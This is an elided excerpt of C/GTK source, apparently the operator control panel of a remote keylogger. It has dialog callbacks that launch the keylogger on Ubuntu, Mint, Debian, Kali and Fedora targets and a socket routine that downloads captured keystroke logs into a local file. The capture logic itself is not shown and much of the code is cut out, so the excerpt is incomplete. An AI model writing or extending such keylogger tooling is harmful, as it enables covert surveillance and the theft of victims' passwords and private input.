...
void cb_exit_the_keylogger(GtkButton *button, gpointer user_data)
{
    ...
    stop_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Do you want to close the keylloger ?");

    gtk_widget_show_all(GTK_DIALOG(stop_keylogger_dialog)->vbox);
...
void cb_ubuntu24_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    ...
    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Ubuntu 24 Keylogger ?\n\nPush F12 server side and download again the log file for stop the keylloger.");
...
void cb_mint_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    ...
    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Mint 22 Keylogger ?\n\nPush F12 server side and download again the log file for stop the keylloger.");
...
void cb_debian_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    ...
    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Debian 12.6 Keylogger ?\n\nPush F12 server side and download again the log file for stop the keylloger.");
...
void cb_kali_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    ...
    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Kali 2024 Keylogger ?\n\nPush F12 server side and download again the log file for stop the keylloger.");
...
void cb_fedora_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    ...
    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Fedora 40 Keylogger ?\n\nPush F12 server side and download again the log file for stop the keylloger.");
...
void cb_download_log_file(GtkButton *button, gpointer user_data)
{
   SOCKET sock;
    ...
    log_file = fopen("Logs/keylogger.log", "a");
    if(log_file == NULL)
    {
        perror("log_file ");
        return;
